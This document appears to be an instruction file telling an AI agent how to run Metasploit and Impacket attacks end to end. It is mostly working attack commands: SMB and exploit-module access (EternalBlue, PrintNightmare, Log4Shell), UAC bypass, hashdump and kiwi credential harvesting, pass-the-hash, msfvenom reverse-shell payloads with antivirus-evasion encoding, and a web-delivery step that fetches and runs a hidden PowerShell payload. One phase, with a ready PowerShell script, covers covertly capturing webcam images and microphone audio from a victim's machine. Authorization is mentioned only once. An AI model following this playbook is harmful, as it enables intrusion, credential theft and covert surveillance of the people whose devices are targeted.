# Metasploit Framework — Complete Pentesting Guide

When the user asks about Metasploit, pentesting, or exploitation, follow this guide strictly. Only against authorized targets.

## CRITICAL RULES — READ FIRST

1. **NEVER loop on failing HTTP endpoints.** If an API returns 401/403/404 twice, STOP. Switch to shell-based access.
2. **Use what works.** If Impacket/SMB/SSH connects, USE IT immediately. Don't abandon working access to try HTTP APIs.
3. **Shell > API always.** A shell (wmiexec, psexec, meterpreter, SSH) gives you EVERYTHING. HTTP APIs are secondary.
4. **Identify targets correctly.** Verify what a device actually is before attacking it. A Sonoff plug is not a camera.
5. **One plan at a time.** Complete each phase before starting the next. Don't stack plans.
6. **Max 3 attempts per technique.** If it fails 3 times, it won't work. Move to next technique.
7. **Track state explicitly.** After each phase, state what you have (sessions, creds, access level) before proceeding.

## Decision Tree — Follow This Flow

```
START: User wants to pentest target IP
  │
  ├─> Phase 1: RECON (nmap + MSF scanners)
  │     └─> Output: open ports, OS, services
  │
  ├─> Phase 2: IDENTIFY ATTACK VECTOR (pick ONE based on ports)
  │     ├─ Port 22 open?  ──> SSH brute/creds
  │     ├─ Port 445 open? ──> SMB (psexec/wmiexec) ← FASTEST ON WINDOWS
  │     ├─ Port 5985 open? ─> WinRM (evil-winrm)
  │     ├─ Port 3389 open? ─> RDP
  │     ├─ Port 80/443?   ──> Web exploit (LAST RESORT)
  │     └─ Other ports?   ──> Research service, find exploit
  │
  ├─> Phase 3: GAIN SHELL (use the vector that WORKS)
  │     ├─ Got shell? ──> Phase 4
  │     └─ No shell?  ──> Try NEXT vector, don't retry same one
  │
  ├─> Phase 4: POST-EXPLOITATION (from inside the shell)
  │     ├─ Enumerate: whoami, sysinfo, network, users, devices
  │     ├─ Escalate: privesc if needed
  │     └─ Execute objective: webcam, files, persistence, etc.
  │
  └─> Phase 5: CLEANUP & REPORT
```

## Installation & Setup

```bash
# Install
sudo dnf install -y metasploit-framework    # Fedora
sudo apt install -y metasploit-framework     # Debian/Ubuntu/Kali

# Database setup (required for workspace/creds tracking)
sudo systemctl start postgresql
sudo msfdb init
msfconsole -q -x "db_status"

# If db_status says "not connected":
sudo msfdb reinit
```

## Phase 1: Reconnaissance

### Quick Scan (do this FIRST, always)
```bash
# Fast targeted scan with nmap (outside MSF — faster)
nmap -sT -sV -T4 -Pn -p 22,80,135,443,445,3306,3389,5432,5900,5985,8080,8443 <IP>

# Full port scan (if quick scan doesn't find enough)
nmap -p- -T4 -Pn <IP>

# OS detection
nmap -O -Pn <IP>
```

### MSF Service Scanners (use AFTER nmap, for specific services)
```bash
msfconsole -q

# SMB — identifies Windows version, domain, shares
use auxiliary/scanner/smb/smb_version
set RHOSTS <IP>
run

# SMB shares enumeration
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <IP>
set SMBUser administrator
set SMBPass <password>
run

# SSH version
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <IP>
run

# HTTP
use auxiliary/scanner/http/title
set RHOSTS <IP>
run

# WinRM check
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS <IP>
run
```

### After Recon: STOP and State What You Found
Before proceeding, explicitly list:
- OS and version
- Open ports and services
- Any credentials found
- Attack vector chosen and WHY

## Phase 2: Gaining Access

### METHOD A: SMB/Impacket (Windows — PREFERRED, fastest)

If port 445 is open and you have credentials:
```bash
# Test credentials first
impacket-smbclient 'administrator:password@<IP>'
# If this connects, you have access. Proceed immediately.

# Get shell with wmiexec (stealthier, runs as user)
impacket-wmiexec 'administrator:password@<IP>'

# Or psexec (noisier, runs as SYSTEM)
impacket-psexec 'administrator:password@<IP>'

# Or smbexec (alternative)
impacket-smbexec 'administrator:password@<IP>'
```

**IMPORTANT: Once wmiexec/psexec connects, you have a SHELL. Use it. Don't switch to HTTP APIs.**

### METHOD B: Metasploit PSExec (alternative to Impacket)
```bash
use exploit/windows/smb/psexec
set RHOSTS <IP>
set SMBUser administrator
set SMBPass password
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4445          # Use 4445 if 4444 is busy
exploit
```

### METHOD C: Meterpreter via Web Delivery (if you already have any shell)
```bash
# Step 1: Set up handler + delivery server
use exploit/multi/script/web_delivery
set TARGET 2            # 0=Python, 2=PowerShell, 5=Linux
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4445
set SRVPORT 8888
exploit -j
# This prints a command like: powershell.exe -nop -w hidden -e <base64>

# Step 2: Run that command in your existing shell (wmiexec/psexec)
# Copy the printed command and execute it in the remote shell

# Step 3: Check for session
sessions -l
sessions -i 1
```

### METHOD D: SSH (Linux targets)
```bash
# With credentials
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <IP>
set USERNAME root
set PASSWORD password
run
# Creates a session automatically

# Brute force (lab only)
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <IP>
set USER_FILE /usr/share/wordlists/common_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set THREADS 4
run
```

### METHOD E: Known Exploits
```bash
# EternalBlue (Windows 7/2008, MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <YOUR_IP>
set LPORT 4445
exploit

# PwnKit (Linux, CVE-2021-4034)
# Requires existing session
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION 1
exploit

# PrintNightmare (Windows, CVE-2021-34527)
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS <IP>
set LHOST <YOUR_IP>
exploit

# Log4Shell (CVE-2021-44228)
use exploit/multi/http/log4shell_header_injection
set RHOSTS <IP>
set RPORT 8080
set LHOST <YOUR_IP>
exploit

# Search for more by CVE or service
search cve:2024
search type:exploit name:apache
search type:exploit platform:windows rank:excellent
```

### Port Already in Use? Change LPORT
```bash
# If "Address already in use" error:
set LPORT 4445    # or 4446, 5555, 6666 — any free port
# Check which ports are free:
# In another terminal: ss -tlnp | grep 444
```

## Phase 3: Post-Exploitation

### From Meterpreter Session
```bash
# Basic enumeration (do ALL of these first)
sysinfo
getuid
getpid
ifconfig
ps

# File system
ls C:\\Users
cat C:\\Users\\<user>\\Desktop\\*.txt
download C:\\important.doc /tmp/

# Privilege escalation (if not SYSTEM)
getsystem
# If getsystem fails:
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
run

# Credential harvesting
hashdump
load kiwi
creds_all
```

### From Impacket Shell (wmiexec/psexec)
```bash
# System info
whoami && hostname && systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Network
ipconfig /all
netstat -an | findstr LISTEN

# Users
net user
net localgroup Administrators

# List devices (including webcams)
powershell -c "Get-PnpDevice -Class Camera"
powershell -c "Get-PnpDevice -Class Image"
powershell -c "Get-PnpDevice | Where-Object {$_.FriendlyName -match 'cam|video|web'}"
wmic path Win32_PnPEntity where "Caption like '%Camera%' or Caption like '%Video%' or Caption like '%Webcam%'" get Caption,DeviceID,Status

# List USB devices
powershell -c "Get-PnpDevice -Class USB | Where-Object {$_.Status -eq 'OK'}"

# Running processes
tasklist /FO TABLE | findstr /I "cam video"

# Installed software
wmic product get name | findstr /I "cam video"
```

## Phase 4: Webcam Control (the right way)

### RULE: You MUST have a Meterpreter session OR a shell first. NEVER try webcam via HTTP APIs.

### Method 1: Meterpreter Webcam (BEST — fully integrated)
```bash
# From active meterpreter session:
webcam_list                              # List available cameras
webcam_snap -i 1 -p /tmp/photo.jpg      # Capture photo from camera 1
webcam_snap -i 1 -q 80 -p /tmp/hq.jpg   # Higher quality
webcam_stream -i 1                       # Live stream (opens browser)

# Record video
record_mic -d 10                         # Audio, 10 seconds

# Transfer
download /tmp/photo.jpg ./captured.jpg
```

### Method 2: PowerShell via Shell (if no Meterpreter)
```bash
# Step 1: List webcams
powershell -c "Get-PnpDevice -Class Camera -Status OK"
powershell -c "Get-PnpDevice -Class Image -Status OK"

# Step 2: Capture photo with PowerShell + .NET
# Upload capture script:
impacket-smbclient 'administrator:password@<IP>' -c 'put /tmp/capture.ps1 C:\temp\capture.ps1'

# Step 3: Execute it
impacket-wmiexec 'administrator:password@<IP>' 'powershell -ExecutionPolicy Bypass -File C:\temp\capture.ps1'

# Step 4: Download the photo
impacket-smbclient 'administrator:password@<IP>' -c 'get C:\temp\webcam.jpg /tmp/webcam.jpg'
```

PowerShell webcam capture script (`capture.ps1`):
```powershell
Add-Type -AssemblyName System.Windows.Forms
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WebcamCapture {
    [DllImport("avicap32.dll")]
    public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hwnd, int nID);
    [DllImport("user32.dll")]
    public static extern bool SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
    [DllImport("user32.dll")]
    public static extern bool DestroyWindow(IntPtr hWnd);
}
"@
$WM_CAP_START = 0x400
$WM_CAP_DRIVER_CONNECT = $WM_CAP_START + 10
$WM_CAP_DRIVER_DISCONNECT = $WM_CAP_START + 11
$WM_CAP_SAVEDIB = $WM_CAP_START + 25
$WM_CAP_GRAB_FRAME = $WM_CAP_START + 60
$hwnd = [WebcamCapture]::capCreateCaptureWindowA("cap", 0, 0, 0, 640, 480, [IntPtr]::Zero, 0)
[WebcamCapture]::SendMessage($hwnd, $WM_CAP_DRIVER_CONNECT, 0, 0)
Start-Sleep -Seconds 2
[WebcamCapture]::SendMessage($hwnd, $WM_CAP_GRAB_FRAME, 0, 0)
[WebcamCapture]::SendMessage($hwnd, $WM_CAP_SAVEDIB, 0, [Runtime.InteropServices.Marshal]::StringToHGlobalAnsi("C:\temp\webcam.bmp"))
[WebcamCapture]::SendMessage($hwnd, $WM_CAP_DRIVER_DISCONNECT, 0, 0)
[WebcamCapture]::DestroyWindow($hwnd)
Write-Host "Saved to C:\temp\webcam.bmp"
```

### Method 3: ffmpeg via Shell (Linux targets)
```bash
# From SSH or meterpreter shell on Linux:
# List video devices
ls -la /dev/video*
v4l2-ctl --list-devices

# Capture single frame
ffmpeg -f v4l2 -i /dev/video0 -frames:v 1 -y /tmp/capture.jpg

# Record 10 seconds video
ffmpeg -f v4l2 -i /dev/video0 -t 10 -y /tmp/video.mp4

# Transfer
scp user@<IP>:/tmp/capture.jpg ./capture.jpg
```

### Method 4: Upgrade Shell to Meterpreter (recommended if you only have basic shell)
```bash
# In msfconsole, if you have a basic shell session:
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LPORT 4446
run
# Now you have full meterpreter with webcam_snap etc.
```

## Phase 5: Pivoting & Lateral Movement

```bash
# Add route through compromised host
route add 10.0.0.0/24 <SESSION_ID>

# SOCKS proxy for external tools
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
# Then: proxychains nmap -sT 10.0.0.0/24

# Port forwarding
portfwd add -l 3389 -p 3389 -r 10.0.0.5
# Now: rdesktop 127.0.0.1:3389

# Pass the hash (with captured NTLM)
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.5
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
exploit
```

## Payload Generation (msfvenom)

```bash
# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4445 -f elf -o shell.elf

# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4445 -f exe -o shell.exe

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=4445 -f raw -o shell.py

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4445 -f raw -o shell.php

# PowerShell one-liner
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4445 -f psh-cmd

# Stageless (self-contained, no handler needed for initial connect)
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4445 -f elf -o stageless.elf

# Encoded (basic AV evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4445 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

### Handler Setup (MUST match payload)
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp    # MUST match msfvenom payload
set LHOST 0.0.0.0
set LPORT 4445                                      # MUST match msfvenom LPORT
set ExitOnSession false                              # Keep listening
exploit -j                                           # Background
```

## Automation with Resource Scripts

```bash
# Create a scan-and-exploit script
cat > /tmp/auto_pentest.rc << 'RCEOF'
use auxiliary/scanner/smb/smb_version
set RHOSTS <TARGET_RANGE>
run

use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET_RANGE>
set SMBUser administrator
set SMBPass password
run

use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser administrator
set SMBPass password
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4445
exploit -j
RCEOF

msfconsole -r /tmp/auto_pentest.rc
```

## Anti-Patterns — DO NOT DO THESE

1. **DON'T loop on HTTP APIs when you have shell access.** Shell gives you everything. HTTP APIs are unreliable and often require auth you don't have.
2. **DON'T try the same endpoint more than 3 times.** If it returns 401/403/404 three times, it won't work the fourth time.
3. **DON'T confuse device types.** Verify what a device is before attacking it. Check MAC address OUI, service banners, and device responses. A Sonoff plug is NOT a camera.
4. **DON'T abandon working access.** If wmiexec connects, that's your shell. Use it. Don't go back to trying curl.
5. **DON'T use port 4444 without checking.** Always `ss -tlnp | grep <port>` first. Use 4445, 4446, or other free ports.
6. **DON'T stack multiple plans.** Finish one phase completely before starting the next.
7. **DON'T run exploits without checking first.** Use `check` command when available — it's non-destructive.
8. **DON'T guess API endpoints.** If you don't know the API, get a shell and explore from inside.
9. **DON'T skip enumeration.** Always run sysinfo/whoami/ifconfig BEFORE trying to use webcam/files/etc.
10. **DON'T forget to track your sessions.** `sessions -l` after every exploit attempt.

## Troubleshooting

### "Address already in use" on LPORT
```bash
# Find what's using the port
ss -tlnp | grep 4444
# Kill it or use a different port
set LPORT 4445
```

### "No session was created"
- Check LHOST is correct (your actual IP, not 127.0.0.1)
- Check firewall: `sudo iptables -I INPUT -p tcp --dport 4445 -j ACCEPT`
- Try stageless payload instead of staged
- Try different LPORT

### "Exploit completed but no session"
- Target may be patched
- AV may have caught the payload
- Try a different exploit module
- Try encoded payload with msfvenom

### wmiexec/psexec connects but commands return empty
- User may not have admin rights
- Try different user or pass-the-hash
- Check: `impacket-wmiexec 'user:pass@<IP>' 'whoami'` — if empty, creds may be wrong

### Meterpreter dies immediately
- AV killed the process
- Migrate immediately: `run post/windows/manage/migrate`
- Or use HTTPS payload: `set PAYLOAD windows/x64/meterpreter/reverse_https`
